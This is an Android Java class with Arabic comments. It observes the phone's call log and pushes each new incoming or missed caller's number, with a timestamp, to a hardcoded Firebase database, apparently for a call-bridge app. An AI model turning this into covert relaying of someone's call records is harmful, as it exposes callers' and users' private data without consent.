package com.cdma.gsm.call;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.provider.CallLog;
import android.util.Log;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import java.util.HashMap;
import java.util.Map;

public class CallLogObserver extends ContentObserver {

    private Context context;
    private static final String TAG = "CallLogObserver";
    private static final String DB_URL = "https://banproject-2f9c6-default-rtdb.firebaseio.com/";
    private String lastHandledNumber = "";

    public CallLogObserver(Handler handler, Context context) {
        super(handler);
        this.context = context;
    }

    @Override
    public void onChange(boolean selfChange, Uri uri) {
        super.onChange(selfChange, uri);
        // يتم استدعاء هذه الدالة فور حدوث أي تغيير في سجل المكالمات
        checkLastCallEntry();
    }

    private void checkLastCallEntry() {
        try {
            // الاستعلام عن آخر مكالمة مضافة للسجل (ترتيب تنازلي حسب التاريخ)
            Cursor cursor = context.getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    null, null, null,
                    CallLog.Calls.DATE + " DESC"
            );

            if (cursor != null && cursor.moveToFirst()) {
                int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
                
                String incomingNumber = cursor.getString(numberIndex);
                int callType = cursor.getInt(typeIndex);

                // التأكد أنها مكالمة صادرة أو فائتة (أندرويد يسجلها هكذا فور الرنين)
                // والتأكد من عدم تكرار إرسال نفس الرقم في نفس اللحظة
                if ((callType == CallLog.Calls.INCOMING_TYPE || callType == CallLog.Calls.MISSED_TYPE) 
                    && !incomingNumber.equals(lastHandledNumber)) {
                    
                    lastHandledNumber = incomingNumber;
                    Log.d(TAG, "تم اكتشاف رقم جديد في السجل: " + incomingNumber);
                    
                    // إرسال البيانات فوراً إلى Firebase
                    sendToFirebase(incomingNumber);
                }
                cursor.close();
            }
        } catch (SecurityException e) {
            Log.e(TAG, "خطأ: إذن سجل المكالمات غير ممنوح للتطبيق.");
        } catch (Exception e) {
            Log.e(TAG, "خطأ أثناء قراءة سجل المكالمات: " + e.getMessage());
        }
    }

    private void sendToFirebase(String number) {
        FirebaseDatabase database = FirebaseDatabase.getInstance(DB_URL);
        DatabaseReference myRef = database.getReference("bridge_signals");

        Map<String, Object> data = new HashMap<>();
        data.put("number", number);
        data.put("type", "CALL");
        data.put("method", "CallLogObserver"); // لتمييز مصدر البيانات
        data.put("timestamp", System.currentTimeMillis());

        // استخدام setValue يجعل التحديث لحظياً ويصل للمستقبل في أجزاء من الثانية
        myRef.setValue(data).addOnFailureListener(e -> 
            Log.e(TAG, "فشل الإرسال لـ Firebase: " + e.getMessage())
        );
    }
}
